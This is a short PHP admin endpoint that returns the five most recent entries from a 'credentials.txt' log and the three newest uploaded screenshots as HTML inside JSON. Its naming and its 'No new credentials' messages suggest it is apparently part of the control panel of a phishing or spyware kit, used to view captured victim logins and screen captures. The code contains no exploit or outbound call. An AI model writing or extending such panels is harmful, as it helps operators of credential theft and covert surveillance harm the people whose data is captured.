<?php
session_start();
if(!isset($_SESSION['admin_logged_in'])) {
    header('HTTP/1.0 403 Forbidden');
    exit;
}

$logs_dir = '../logs/';
$uploads_dir = '../uploads/';
$response = ['credentials' => '', 'screenshots' => ''];

$creds = file_exists($logs_dir . 'credentials.txt') ? file($logs_dir . 'credentials.txt') : [];
$recent_creds = array_slice(array_reverse($creds), 0, 5);
$html = '';
foreach($recent_creds as $line) {
    $line = htmlspecialchars($line);
    $html .= '<div style="padding:4px 0;border-bottom:1px solid #16213e;color:#e94560;font-size:12px;font-family:monospace;">' . $line . '</div>';
}
$response['credentials'] = $html ?: '<div style="color:#666;">No new credentials</div>';

$screenshots = glob($uploads_dir . '*.png');
$recent_ss = array_slice(array_reverse($screenshots), 0, 3);
$html = '';
foreach($recent_ss as $ss) {
    $name = basename($ss);
    $html .= '<div style="margin-bottom:8px;">';
    $html .= '<img src="../uploads/' . $name . '" style="width:100%;border-radius:4px;max-height:150px;object-fit:cover;border:1px solid #16213e;">';
    $html .= '<div style="font-size:10px;color:#666;margin-top:2px;">' . $name . '</div>';
    $html .= '</div>';
}
$response['screenshots'] = $html ?: '<div style="color:#666;text-align:center;padding:20px;">No screenshots</div>';

header('Content-Type: application/json');
echo json_encode($response);